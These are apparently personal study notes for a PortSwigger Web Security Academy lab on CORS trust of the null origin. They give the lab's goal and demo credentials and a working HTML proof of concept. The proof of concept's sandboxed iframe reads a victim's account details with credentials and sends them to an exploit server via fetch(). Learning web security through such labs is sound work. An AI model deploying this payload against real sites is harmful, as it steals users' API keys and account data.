---
tags:
  - APPRENTICE
Link:
  - "[[CORS]]"
External Link:
  - https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
---

# CORS vulnerability with trusted null origin
---

**Target Goal** - Exploit the CORS misconfiguration to retrieve the administrator's API key

**Creds** - wiener : peter

**Analysis:**

**Testing for CORS misconfigurations:**
1. Change the origin to an arbitrary value
2. Change the origin header to the null value

**POC**:

```html
<html>
	<body>
		<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
		<script>
			var url = 'http://YOUR-LAB-ID.web-security-academy.net'
			var req = new XMLHttpRequest();
			req.onreadystatechange = reqListener;
			req.open('GET', url + '/accountDetails', true);
			req.withCredentials = true;
			req.send(null);
			
			function reqListener(){
				if(req.readyState == XMLHttpRequest.DONE){
					fetch('https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + req.responseText)
				}
			}
		</script>"></iframe>
	</body>
</html>
```





















